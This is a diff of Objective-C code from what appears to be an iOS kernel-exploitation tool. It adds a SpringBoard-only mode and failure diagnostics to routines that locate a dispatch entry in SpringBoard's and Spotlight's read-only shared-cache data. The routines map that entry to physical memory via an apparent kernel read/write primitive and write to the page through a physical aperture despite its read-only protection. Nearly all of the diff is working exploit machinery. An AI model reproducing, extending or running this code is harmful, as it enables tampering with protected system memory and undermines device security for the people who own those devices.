@@ -54,6 +54,28 @@ static const uint32_t kCNDHailMaryRODataMaximumProtection = 1;
 
 static volatile int gCNDHailMaryRODataRunning;
 
+/* Compact description of one single-process translation, used only when the
+ * shared-pair check fails: it names the process and level that disagreed so a
+ * post-wire private leaf entry is not mistaken for a page identity break. */
+static NSDictionary<NSString *, id> *CNDHailMaryRODataTranslationSummary(
+    NSDictionary<NSString *, id> *translation,
+    NSString *error)
+{
+    if (![translation isKindOfClass:NSDictionary.class]) {
+        return @{@"translated": @NO, @"error": error ?: @"unknown"};
+    }
+    return @{
+        @"translated": @YES,
+        @"terminalLevel": translation[@"terminalLevel"] ?: @0,
+        @"terminalEntryAddress":
+            translation[@"terminalEntryAddress"] ?: @"",
+        @"terminalEntryValue": translation[@"terminalEntryValue"] ?: @"",
+        @"physicalFrame": translation[@"physicalFrame"] ?: @"",
+        @"physicalAddress": translation[@"physicalAddress"] ?: @"",
+        @"translationStable": translation[@"translationStable"] ?: @NO,
+    };
+}
+
 static NSString *CNDHailMaryRODataHex(uint64_t value)
 {
     return [NSString stringWithFormat:@"0x%016llx",
@@ -252,15 +274,18 @@ static BOOL CNDHailMaryRODataAddSlideCandidate(
     return YES;
 }
 
-BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
+BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntryWithMode(
+    CNDHailMaryProofMode mode,
     NSDictionary<NSString *, id> *probeReport,
     BOOL expectRedirected,
     NSDictionary<NSString *, id> **contextOut,
     NSData **guardDataOut,
+    NSDictionary<NSString *, id> **diagnosticsOut,
     NSString **errorOut)
 {
     if (contextOut) *contextOut = nil;
     if (guardDataOut) *guardDataOut = nil;
+    if (diagnosticsOut) *diagnosticsOut = nil;
     if (errorOut) *errorOut = nil;
 
     if (![probeReport isKindOfClass:NSDictionary.class]) {
@@ -325,14 +350,19 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
 
     NSMutableArray<NSMutableDictionary<NSString *, id> *> *candidates =
         [NSMutableArray array];
+    BOOL springBoardOnly = mode == CNDHailMaryProofModeSpringBoardOnly;
     id springProcessCandidate = probeReport[@"springBoard"];
-    id spotlightProcessCandidate = probeReport[@"spotlight"];
+    id spotlightProcessCandidate = springBoardOnly
+        ? nil : probeReport[@"spotlight"];
     id objectSpringCandidate = objectProof[@"springBoard"];
-    id objectSpotlightCandidate = objectProof[@"spotlight"];
+    id objectSpotlightCandidate = springBoardOnly
+        ? nil : objectProof[@"spotlight"];
     if (![springProcessCandidate isKindOfClass:NSDictionary.class] ||
-        ![spotlightProcessCandidate isKindOfClass:NSDictionary.class] ||
+        (!springBoardOnly &&
+            ![spotlightProcessCandidate isKindOfClass:NSDictionary.class]) ||
         ![objectSpringCandidate isKindOfClass:NSDictionary.class] ||
-        ![objectSpotlightCandidate isKindOfClass:NSDictionary.class]) {
+        (!springBoardOnly &&
+            ![objectSpotlightCandidate isKindOfClass:NSDictionary.class])) {
         if (errorOut) *errorOut = @"live-slide-anchors-invalid";
         return NO;
     }
@@ -342,18 +372,28 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
     NSDictionary<NSString *, id> *objectSpring = objectSpringCandidate;
     NSDictionary<NSString *, id> *objectSpotlight =
         objectSpotlightCandidate;
-    NSArray<NSString *> *slideTexts = @[
-        springProcess[@"sharedCacheSlide"] ?: @"",
-        spotlightProcess[@"sharedCacheSlide"] ?: @"",
-        objectSpring[@"slide"] ?: @"",
-        objectSpotlight[@"slide"] ?: @"",
-    ];
-    NSArray<NSString *> *slideSources = @[
-        @"springBoard.sharedCacheSlide",
-        @"spotlight.sharedCacheSlide",
-        @"objectBackingComparison.springBoard.slide",
-        @"objectBackingComparison.spotlight.slide",
-    ];
+    NSArray<NSString *> *slideTexts = springBoardOnly
+        ? @[
+            springProcess[@"sharedCacheSlide"] ?: @"",
+            objectSpring[@"slide"] ?: @"",
+        ]
+        : @[
+            springProcess[@"sharedCacheSlide"] ?: @"",
+            spotlightProcess[@"sharedCacheSlide"] ?: @"",
+            objectSpring[@"slide"] ?: @"",
+            objectSpotlight[@"slide"] ?: @"",
+        ];
+    NSArray<NSString *> *slideSources = springBoardOnly
+        ? @[
+            @"springBoard.sharedCacheSlide",
+            @"objectBackingComparison.springBoard.slide",
+        ]
+        : @[
+            @"springBoard.sharedCacheSlide",
+            @"spotlight.sharedCacheSlide",
+            @"objectBackingComparison.springBoard.slide",
+            @"objectBackingComparison.spotlight.slide",
+        ];
     for (NSUInteger index = 0; index < slideTexts.count; index++) {
         NSString *candidateError = nil;
         if (!CNDHailMaryRODataAddSlideCandidate(
@@ -400,25 +440,55 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
         uint64_t physicalAddress = 0;
         uint64_t frameKVA = 0;
         NSString *translationError = nil;
-        if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
+        BOOL translated = springBoardOnly
+            ? CNDHailMaryProbeTranslateRuntimeAddressInProcessWithPhysical(
+                probeReport, @"SpringBoard", runtimeAddress,
+                &springTranslation, &physicalFrame, &physicalAddress,
+                &frameKVA, &translationError)
+            : CNDHailMaryProbeTranslateSharedRuntimeAddress(
                 probeReport, runtimeAddress,
                 &springTranslation, &spotlightTranslation,
                 &physicalFrame, &physicalAddress, &frameKVA,
-                &translationError) ||
-            !springTranslation || !spotlightTranslation ||
+                &translationError);
+        if (!translated ||
+            !springTranslation || (!springBoardOnly && !spotlightTranslation) ||
             physicalFrame == 0 || physicalFrame == guardedTextFrame ||
             physicalAddress < physicalFrame ||
             physicalAddress - physicalFrame != expectedOffset ||
             !is_kaddr_valid(frameKVA) ||
             expectedOffset >
                 kCNDHailMaryRODataPageSize - EARLY_KRW_LENGTH) {
-            [attempts addObject:@{
+            NSDictionary<NSString *, id> *springOnly = nil;
+            NSDictionary<NSString *, id> *spotlightOnly = nil;
+            NSString *springOnlyError = nil;
+            NSString *spotlightOnlyError = nil;
+            (void)CNDHailMaryProbeTranslateRuntimeAddressInProcess(
+                probeReport, @"SpringBoard", runtimeAddress,
+                &springOnly, &springOnlyError);
+            if (!springBoardOnly) {
+                (void)CNDHailMaryProbeTranslateRuntimeAddressInProcess(
+                    probeReport, @"Spotlight", runtimeAddress,
+                    &spotlightOnly, &spotlightOnlyError);
+            }
+            NSMutableDictionary<NSString *, id> *failedAttempt = [@{
                 @"slide": CNDHailMaryRODataHex(slide),
                 @"runtimeAddress": CNDHailMaryRODataHex(runtimeAddress),
                 @"translated": @NO,
                 @"error": translationError ?:
-                    @"shared-frame-translation-invalid",
-            }];
+                    (springBoardOnly
+                        ? @"springboard-frame-translation-invalid"
+                        : @"shared-frame-translation-invalid"),
+                @"translationMode": springBoardOnly
+                    ? @"springboard-only" : @"shared-pair",
+                @"springBoard": CNDHailMaryRODataTranslationSummary(
+                    springOnly, springOnlyError),
+            } mutableCopy];
+            if (!springBoardOnly) {
+                failedAttempt[@"spotlight"] =
+                    CNDHailMaryRODataTranslationSummary(
+                        spotlightOnly, spotlightOnlyError);
+            }
+            [attempts addObject:failedAttempt];
             continue;
         }
 
@@ -448,7 +518,7 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
         };
         [attempts addObject:attempt];
         if (exactBytes && exactSHA && entry == expectedEntry) {
-            [matches addObject:@{
+            NSMutableDictionary<NSString *, id> *match = [@{
                 @"slide": @(slide),
                 @"runtimeAddress": @(runtimeAddress),
                 @"physicalFrame": @(physicalFrame),
@@ -456,12 +526,21 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
                 @"frameKVA": @(frameKVA),
                 @"windowKVA": @(windowKVA),
                 @"springBoard": springTranslation,
-                @"spotlight": spotlightTranslation,
                 @"sources": candidate[@"sources"] ?: @[],
-            }];
+            } mutableCopy];
+            if (!springBoardOnly) {
+                match[@"spotlight"] = spotlightTranslation;
+            }
+            [matches addObject:[match copy]];
         }
     }
     if (matches.count != 1) {
+        if (diagnosticsOut) {
+            *diagnosticsOut = @{
+                @"attempts": [attempts copy],
+                @"matchCount": @(matches.count),
+            };
+        }
         if (errorOut) *errorOut = matches.count == 0
             ? @"dispatch-entry-guard-not-found"
             : @"dispatch-entry-guard-ambiguous";
@@ -484,11 +563,18 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
     uint64_t finalPhysical = 0;
     uint64_t finalFrameKVA = 0;
     NSString *finalError = nil;
-    if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
+    BOOL finalTranslated = springBoardOnly
+        ? CNDHailMaryProbeTranslateRuntimeAddressInProcessWithPhysical(
+            probeReport, @"SpringBoard", runtimeAddress,
+            &finalSpring, &finalFrame, &finalPhysical, &finalFrameKVA,
+            &finalError)
+        : CNDHailMaryProbeTranslateSharedRuntimeAddress(
             probeReport, runtimeAddress,
             &finalSpring, &finalSpotlight,
             &finalFrame, &finalPhysical, &finalFrameKVA,
-            &finalError) ||
+            &finalError);
+    if (!finalTranslated ||
+        (!springBoardOnly && !finalSpotlight) ||
         finalFrame != physicalFrame || finalPhysical != physicalAddress ||
         finalFrameKVA != frameKVA) {
         if (errorOut) *errorOut = finalError ?:
@@ -519,8 +605,10 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
             @"sources": candidate[@"sources"] ?: @[],
         }];
     }
-    NSDictionary<NSString *, id> *context = @{
+    NSMutableDictionary<NSString *, id> *context = [@{
         @"state": expectRedirected ? @"redirected" : @"original",
+        @"translationMode": springBoardOnly
+            ? @"springboard-only" : @"shared-pair",
         @"runtimeVerified": @YES,
         @"unslidEntryVirtualAddress": CNDHailMaryRODataHex(
             kCNDHailMaryRODataEntryUnslid),
@@ -537,13 +625,9 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
         @"guardBytesHex": expectedHex,
         @"guardSHA256": expectedSHA,
         @"springBoard": finalSpring,
-        @"spotlight": finalSpotlight,
         @"springBoardPID": springProcess[@"pid"] ?: @0,
         @"springBoardProc": springProcess[@"proc"] ?: @"",
         @"springBoardTask": springProcess[@"task"] ?: @"",
-        @"spotlightPID": spotlightProcess[@"pid"] ?: @0,
-        @"spotlightProc": spotlightProcess[@"proc"] ?: @"",
-        @"spotlightTask": spotlightProcess[@"task"] ?: @"",
         @"slideScan": @{
             @"strategy": @"deduplicated-live-proof-anchors",
             @"candidateCount": @(candidates.count),
@@ -551,10 +635,29 @@ BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
             @"candidates": candidateSummary,
             @"attempts": attempts,
         },
-    };
-    if (contextOut) *contextOut = context;
+    } mutableCopy];
+    if (!springBoardOnly) {
+        context[@"spotlight"] = finalSpotlight;
+        context[@"spotlightPID"] = spotlightProcess[@"pid"] ?: @0;
+        context[@"spotlightProc"] = spotlightProcess[@"proc"] ?: @"";
+        context[@"spotlightTask"] = spotlightProcess[@"task"] ?: @"";
+    }
+    if (contextOut) *contextOut = [context copy];
     if (guardDataOut) *guardDataOut = finalData;
     return YES;
+}
+
+BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
+    NSDictionary<NSString *, id> *probeReport,
+    BOOL expectRedirected,
+    NSDictionary<NSString *, id> **contextOut,
+    NSData **guardDataOut,
+    NSDictionary<NSString *, id> **diagnosticsOut,
+    NSString **errorOut)
+{
+    return CNDHailMaryReadOnlyDataPageResolveDispatchEntryWithMode(
+        CNDHailMaryProofModeSharedPair, probeReport, expectRedirected,
+        contextOut, guardDataOut, diagnosticsOut, errorOut);
 }
 
 BOOL CNDHailMaryReadOnlyDataPageIsSupported(NSString **reasonOut)
@@ -567,7 +670,8 @@ BOOL CNDHailMaryReadOnlyDataPageIsRunning(void)
     return __sync_fetch_and_add(&gCNDHailMaryRODataRunning, 0) != 0;
 }
 
-void CNDHailMaryReadOnlyDataPageRun(
+void CNDHailMaryReadOnlyDataPageRunWithMode(
+    CNDHailMaryProofMode mode,
     CNDHailMaryReadOnlyDataPageCompletion completion)
 {
     if (!completion) return;
@@ -585,6 +689,8 @@ void CNDHailMaryReadOnlyDataPageRun(
         @"schemaVersion": @1,
         @"experiment": @"hail-mary-read-only-data-page-aperture-writability",
         @"mode": @"identical-bytes-noop",
+        @"translationMode": mode == CNDHailMaryProofModeSpringBoardOnly
+            ? @"springboard-only" : @"shared-pair",
         @"productType": @CND_HAIL_MARY_RO_DATA_PRODUCT,
         @"productBuildVersion": @CND_HAIL_MARY_RO_DATA_BUILD,
         @"reportPath": reportPath,
@@ -643,7 +749,7 @@ void CNDHailMaryReadOnlyDataPageRun(
         return;
     }
 
-    CNDHailMaryProbeRun(^(NSDictionary<NSString *, id> *probeReport) {
+    CNDHailMaryProbeRunWithMode(mode, ^(NSDictionary<NSString *, id> *probeReport) {
         dispatch_async(dispatch_get_global_queue(
             QOS_CLASS_USER_INITIATED, 0), ^{
             report[@"preflightProbe"] = probeReport ?: @{};
@@ -704,18 +810,30 @@ void CNDHailMaryReadOnlyDataPageRun(
             NSMutableArray<NSMutableDictionary<NSString *, id> *> *candidates =
                 [NSMutableArray array];
             NSString *candidateError = nil;
-            NSArray<NSString *> *slideTexts = @[
-                probeReport[@"springBoard"][@"sharedCacheSlide"] ?: @"",
-                probeReport[@"spotlight"][@"sharedCacheSlide"] ?: @"",
-                objectProof[@"springBoard"][@"slide"] ?: @"",
-                objectProof[@"spotlight"][@"slide"] ?: @"",
-            ];
-            NSArray<NSString *> *slideSources = @[
-                @"springBoard.sharedCacheSlide",
-                @"spotlight.sharedCacheSlide",
-                @"objectBackingComparison.springBoard.slide",
-                @"objectBackingComparison.spotlight.slide",
-            ];
+            BOOL springBoardOnly =
+                mode == CNDHailMaryProofModeSpringBoardOnly;
+            NSArray<NSString *> *slideTexts = springBoardOnly
+                ? @[
+                    probeReport[@"springBoard"][@"sharedCacheSlide"] ?: @"",
+                    objectProof[@"springBoard"][@"slide"] ?: @"",
+                ]
+                : @[
+                    probeReport[@"springBoard"][@"sharedCacheSlide"] ?: @"",
+                    probeReport[@"spotlight"][@"sharedCacheSlide"] ?: @"",
+                    objectProof[@"springBoard"][@"slide"] ?: @"",
+                    objectProof[@"spotlight"][@"slide"] ?: @"",
+                ];
+            NSArray<NSString *> *slideSources = springBoardOnly
+                ? @[
+                    @"springBoard.sharedCacheSlide",
+                    @"objectBackingComparison.springBoard.slide",
+                ]
+                : @[
+                    @"springBoard.sharedCacheSlide",
+                    @"spotlight.sharedCacheSlide",
+                    @"objectBackingComparison.springBoard.slide",
+                    @"objectBackingComparison.spotlight.slide",
+                ];
             for (NSUInteger index = 0; index < slideTexts.count; index++) {
                 if (!CNDHailMaryRODataAddSlideCandidate(
                         candidates, slideTexts[index], slideSources[index],
@@ -788,12 +906,19 @@ void CNDHailMaryReadOnlyDataPageRun(
                 uint64_t physicalAddress = 0;
                 uint64_t frameKVA = 0;
                 NSString *translationError = nil;
-                if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
+                BOOL translated = springBoardOnly
+                    ? CNDHailMaryProbeTranslateRuntimeAddressInProcessWithPhysical(
+                        probeReport, @"SpringBoard", runtimeAddress,
+                        &springTranslation, &physicalFrame, &physicalAddress,
+                        &frameKVA, &translationError)
+                    : CNDHailMaryProbeTranslateSharedRuntimeAddress(
                         probeReport, runtimeAddress,
                         &springTranslation, &spotlightTranslation,
                         &physicalFrame, &physicalAddress, &frameKVA,
-                        &translationError) ||
-                    !springTranslation || !spotlightTranslation ||
+                        &translationError);
+                if (!translated ||
+                    !springTranslation ||
+                    (!springBoardOnly && !spotlightTranslation) ||
                     physicalFrame == 0 || physicalAddress < physicalFrame ||
                     physicalFrame == guardedTextPhysicalFrame ||
                     physicalAddress - physicalFrame != expectedOffset ||
@@ -806,7 +931,9 @@ void CNDHailMaryReadOnlyDataPageRun(
                             runtimeAddress),
                         @"translated": @NO,
                         @"error": translationError ?:
-                            @"shared-frame-translation-invalid",
+                            (springBoardOnly
+                                ? @"springboard-frame-translation-invalid"
+                                : @"shared-frame-translation-invalid"),
                     }];
                     continue;
                 }
@@ -844,7 +971,7 @@ void CNDHailMaryReadOnlyDataPageRun(
                 [attempts addObject:attempt];
                 if (exactBytes && exactSHA &&
                     entry == kCNDHailMaryRODataOriginalEntry) {
-                    [matches addObject:@{
+                    NSMutableDictionary<NSString *, id> *match = [@{
                         @"slide": @(slide),
                         @"runtimeAddress": @(runtimeAddress),
                         @"physicalFrame": @(physicalFrame),
@@ -852,8 +979,11 @@ void CNDHailMaryReadOnlyDataPageRun(
                         @"frameKVA": @(frameKVA),
                         @"windowKVA": @(windowKVA),
                         @"springBoard": springTranslation,
-                        @"spotlight": spotlightTranslation,
-                    }];
+                    } mutableCopy];
+                    if (!springBoardOnly) {
+                        match[@"spotlight"] = spotlightTranslation;
+                    }
+                    [matches addObject:[match copy]];
                 }
             }
             NSMutableDictionary<NSString *, id> *slideScan =
@@ -882,8 +1012,10 @@ void CNDHailMaryReadOnlyDataPageRun(
                 [match[@"physicalAddress"] unsignedLongLongValue];
             uint64_t frameKVA = [match[@"frameKVA"] unsignedLongLongValue];
             uint64_t windowKVA = [match[@"windowKVA"] unsignedLongLongValue];
-            report[@"runtimeIdentity"] = @{
+            NSMutableDictionary<NSString *, id> *runtimeIdentity = [@{
                 @"runtimeVerified": @YES,
+                @"translationMode": springBoardOnly
+                    ? @"springboard-only" : @"shared-pair",
                 @"sharedCacheSlide": CNDHailMaryRODataHex(matchedSlide),
                 @"runtimeEntryVirtualAddress": CNDHailMaryRODataHex(
                     runtimeAddress),
@@ -900,8 +1032,11 @@ void CNDHailMaryReadOnlyDataPageRun(
                 @"differsFromGuardedTextPhysicalFrame": @(
                     physicalFrame != guardedTextPhysicalFrame),
                 @"springBoard": match[@"springBoard"],
-                @"spotlight": match[@"spotlight"],
-            };
+            } mutableCopy];
+            if (!springBoardOnly) {
+                runtimeIdentity[@"spotlight"] = match[@"spotlight"];
+            }
+            report[@"runtimeIdentity"] = [runtimeIdentity copy];
 
             report[@"stage"] = @"final-prewrite-identity-check";
             NSDictionary<NSString *, id> *finalSpring = nil;
@@ -910,11 +1045,18 @@ void CNDHailMaryReadOnlyDataPageRun(
             uint64_t finalPhysical = 0;
             uint64_t finalFrameKVA = 0;
             NSString *finalTranslationError = nil;
-            if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
+            BOOL finalTranslated = springBoardOnly
+                ? CNDHailMaryProbeTranslateRuntimeAddressInProcessWithPhysical(
+                    probeReport, @"SpringBoard", runtimeAddress,
+                    &finalSpring, &finalFrame, &finalPhysical,
+                    &finalFrameKVA, &finalTranslationError)
+                : CNDHailMaryProbeTranslateSharedRuntimeAddress(
                     probeReport, runtimeAddress,
                     &finalSpring, &finalSpotlight,
                     &finalFrame, &finalPhysical, &finalFrameKVA,
-                    &finalTranslationError) ||
+                    &finalTranslationError);
+            if (!finalTranslated ||
+                (!springBoardOnly && !finalSpotlight) ||
                 finalFrame != physicalFrame ||
                 finalPhysical != physicalAddress ||
                 finalFrameKVA != frameKVA) {
@@ -1023,30 +1165,43 @@ void CNDHailMaryReadOnlyDataPageRun(
             uint64_t postPhysical = 0;
             uint64_t postFrameKVA = 0;
             NSString *postError = nil;
-            BOOL postTranslationStable =
-                CNDHailMaryProbeTranslateSharedRuntimeAddress(
+            BOOL postTranslated = springBoardOnly
+                ? CNDHailMaryProbeTranslateRuntimeAddressInProcessWithPhysical(
+                    probeReport, @"SpringBoard", runtimeAddress,
+                    &postSpring, &postFrame, &postPhysical, &postFrameKVA,
+                    &postError)
+                : CNDHailMaryProbeTranslateSharedRuntimeAddress(
                     probeReport, runtimeAddress,
                     &postSpring, &postSpotlight,
                     &postFrame, &postPhysical, &postFrameKVA,
-                    &postError) &&
+                    &postError);
+            BOOL postTranslationStable =
+                postTranslated &&
+                (!springBoardOnly ? postSpotlight != nil : YES) &&
                 postFrame == physicalFrame &&
                 postPhysical == physicalAddress &&
                 postFrameKVA == frameKVA;
-            report[@"postWriteTranslation"] = postTranslationStable
-                ? @{
+            NSMutableDictionary<NSString *, id> *postWriteTranslation =
+                postTranslationStable
+                ? [@{
                     @"performed": @YES,
                     @"stable": @YES,
+                    @"translationMode": springBoardOnly
+                        ? @"springboard-only" : @"shared-pair",
                     @"physicalFrame": CNDHailMaryRODataHex(postFrame),
                     @"physicalAddress": CNDHailMaryRODataHex(postPhysical),
                     @"springBoard": postSpring,
-                    @"spotlight": postSpotlight,
-                }
-                : @{
+                } mutableCopy]
+                : [@{
                     @"performed": @YES,
                     @"stable": @NO,
                     @"error": postError ?:
                         @"post-write-translation-changed",
-                };
+                } mutableCopy];
+            if (!springBoardOnly) {
+                postWriteTranslation[@"spotlight"] = postSpotlight;
+            }
+            report[@"postWriteTranslation"] = [postWriteTranslation copy];
 
             BOOL confirmed = readbackIdentical && postTranslationStable;
             report[@"confirmed"] = @(confirmed);
@@ -1056,11 +1211,20 @@ void CNDHailMaryReadOnlyDataPageRun(
                     ? @"post-write-translation-unstable"
                     : @"aperture-read-only-data-page-readback-mismatch");
             report[@"message"] = confirmed
-                ? @"The exact .34 guard was proven live in both processes and its identical-bytes dispatch returned; readback remained exact and both translations stayed stable. The physical aperture accepts writes to this read-only-data page despite maxProt=r--."
+                ? (springBoardOnly
+                    ? @"The exact .34 guard was proven live in SpringBoard and its identical-bytes dispatch returned; readback remained exact and SpringBoard's translation stayed stable. The physical aperture accepts writes to this read-only-data page despite maxProt=r--."
+                    : @"The exact .34 guard was proven live in both processes and its identical-bytes dispatch returned; readback remained exact and both translations stayed stable. The physical aperture accepts writes to this read-only-data page despite maxProt=r--.")
                 : (readbackIdentical
                     ? @"The .34 identical-bytes dispatch returned and readback stayed exact, but a post-write translation changed."
                     : @"The .34 identical-bytes dispatch returned but the guarded window did not read back exactly.");
             CNDHailMaryRODataFinish(report, completion);
         });
     });
+}
+
+void CNDHailMaryReadOnlyDataPageRun(
+    CNDHailMaryReadOnlyDataPageCompletion completion)
+{
+    CNDHailMaryReadOnlyDataPageRunWithMode(
+        CNDHailMaryProofModeSharedPair, completion);
 }
